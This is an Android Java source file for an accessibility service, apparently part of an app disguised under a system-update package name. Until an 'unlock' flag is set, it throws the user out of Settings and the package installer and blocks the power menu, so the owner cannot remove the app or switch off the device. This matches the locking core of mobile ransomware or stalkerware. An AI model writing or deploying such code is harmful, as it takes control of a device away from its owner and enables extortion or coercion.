package com.system.updatex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class KioskAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_unlocked", false);
        if (isUnlocked) return;
        if (event == null || event.getPackageName() == null) return;

        String foregroundPackage = event.getPackageName().toString();
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // BRUTAL KICK: If they open Settings or Package Installer, kick instantly
        if (foregroundPackage.contains("settings") || foregroundPackage.contains("packageinstaller")) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            return;
        }

        // Block Power Menu
        if (foregroundPackage.contains("systemui") && className.contains("GlobalActions")) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            return;
        }
    }
    @Override
    public void onInterrupt() {}
}
